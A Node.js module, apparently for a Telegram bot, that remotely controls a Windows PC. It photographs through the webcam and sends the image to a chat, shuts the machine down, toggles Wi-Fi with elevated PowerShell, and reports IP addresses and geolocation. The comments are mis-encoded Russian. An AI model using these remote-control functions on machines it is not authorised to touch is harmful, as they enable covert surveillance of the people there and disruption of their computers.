const NodeWebcam = require('node-webcam'); // –î–ª—è —Ä–∞–±–æ—Ç—ã —Å –≤–µ–±-–∫–∞–º–µ—Ä–æ–π
const fs = require('fs');
// const { exec } = require('child_process');
const sudo = require('sudo-prompt');
const os = require('os');
const axios = require('axios');


// –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è –∫–∞–º–µ—Ä—ã
const webcamOptions = {
     width: 1280,
     height: 720,
     quality: 100,
     delay: 0,
     saveShots: true,
     output: "jpeg",
     device: false,
     callbackReturn: "location",
     verbose: false
};
// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å –∫–∞–º–µ—Ä—ã
exports.takePhoto = (bot, chatId) => {
     const filePath = './photo.jpg'; // –ü—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è

     // –°–æ–∑–¥–∞–µ–º –æ–±—ä–µ–∫—Ç –∫–∞–º–µ—Ä—ã
     const Webcam = NodeWebcam.create(webcamOptions);

     // –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
     Webcam.capture(filePath, (err, data) => {
          if (err) {
               bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞—Ö–≤–∞—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: ${err.message}`);
               return;
          }

          // –ï—Å–ª–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
          bot.sendPhoto(chatId, fs.createReadStream(filePath), {
               caption: '–í–æ—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã! üì∏'
          }, (error) => {
               if (error) {
                    bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: ${error.message}`);
               }

               // –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
               fs.unlinkSync(filePath);
          });
     });
};

const { exec } = require('child_process');





// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
exports.shutdown = (bot, chatId) => {
     const exec = require('child_process').exec;
     exec('shutdown /s /t 0', (error, stdout, stderr) => {
          if (error) {
               bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: ${error.message}`);
               return;
          }
          bot.sendMessage(chatId, '–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...');
     });
};


// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è Wi-Fi
const options = {
     name: 'MyBot'
};

// –ò–º—è Wi-Fi –∞–¥–∞–ø—Ç–µ—Ä–∞
const wifiAdapterName = '–ë–µ—Å–ø—Ä–æ–≤–æ–¥–Ω–∞—è —Å–µ—Ç—å';
// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è Wi-Fi —á–µ—Ä–µ–∑ PowerShell
exports.disableWifi = (bot, chatId) => {
     const powershellCommand = `powershell -Command "Disable-NetAdapter -Name '${wifiAdapterName}' -Confirm:$false"`;
     sudo.exec(powershellCommand, options, (error, stdout, stderr) => {
          if (error) {
               bot.sendMessage(chatId, `–û—à–∏–±–∫–∞: ${error.message}`);
               return;
          }
          if (stderr) {
               bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: ${stderr}`);
               return;
          }
          bot.sendMessage(chatId, 'Wi-Fi –æ—Ç–∫–ª—é—á–µ–Ω! üì¥');

          // –¢–∞–π–º–µ—Ä –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–∏—è Wi-Fi —á–µ—Ä–µ–∑ 30 —Å–µ–∫—É–Ω–¥
          setTimeout(() => {
               const enableCommand = `powershell -Command "Enable-NetAdapter -Name '${wifiAdapterName}' -Confirm:$false"`;
               sudo.exec(enableCommand, options, (error, stdout, stderr) => {
                    if (error) {
                         bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ Wi-Fi: ${error.message}`);
                         return;
                    }
                    if (stderr) {
                         bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã –≤–∫–ª—é—á–µ–Ω–∏—è: ${stderr}`);
                         return;
                    }
                    bot.sendMessage(chatId, 'Wi-Fi —Å–Ω–æ–≤–∞ –≤–∫–ª—é—á–µ–Ω! üì∂');
               });
          }, 10000); // 10000 –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥ = 10 —Å–µ–∫—É–Ω–¥
     });
};


// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ IP-–∞–¥—Ä–µ—Å–∞
exports.getLocalIp = (bot, chatId) => {
     const networkInterfaces = os.networkInterfaces();
     let ipAddress = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP-–∞–¥—Ä–µ—Å';

     // –ü—Ä–æ—Ö–æ–¥–∏–º –ø–æ –≤—Å–µ–º —Å–µ—Ç–µ–≤—ã–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞–º
     for (let interfaceName in networkInterfaces) {
          const addresses = networkInterfaces[interfaceName];

          // –ò—â–µ–º –ø–µ—Ä–≤—ã–π IPv4-–∞–¥—Ä–µ—Å
          for (let address of addresses) {
               if (address.family === 'IPv4' && !address.internal) {
                    ipAddress = address.address;
                    break;
               }
          }
     }

     // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º IP-–∞–¥—Ä–µ—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
     bot.sendMessage(chatId, `–õ–æ–∫–∞–ª—å–Ω—ã–π IP-–∞–¥—Ä–µ—Å: ${ipAddress}`);
};

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–Ω–µ—à–Ω–µ–≥–æ IP-–∞–¥—Ä–µ—Å–∞ —á–µ—Ä–µ–∑ API
exports.getExternalIp = async (bot, chatId) => {
     try {
          const response = await axios.get('https://api.ipify.org?format=json');
          const externalIp = response.data.ip;
          bot.sendMessage(chatId, `–í–Ω–µ—à–Ω–∏–π IP-–∞–¥—Ä–µ—Å: ${externalIp}`);
     } catch (error) {
          bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≤–Ω–µ—à–Ω–µ–≥–æ IP-–∞–¥—Ä–µ—Å–∞: ${error.message}`);
     }
};


// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–æ IP —á–µ—Ä–µ–∑ API ipinfo.io
exports.getGeoLocation = async (bot, chatId) => {
     try {
          const response = await axios.get('https://ipinfo.io/json');
          const { ip, city, region, country, loc } = response.data;
          bot.sendMessage(chatId, `IP: ${ip}\n–ì–æ—Ä–æ–¥: ${city}\n–†–µ–≥–∏–æ–Ω: ${region}\n–°—Ç—Ä–∞–Ω–∞: ${country}\n–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${loc}`);
     } catch (error) {
          bot.sendMessage(chatId, `–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ${error.message}`);
     }
};

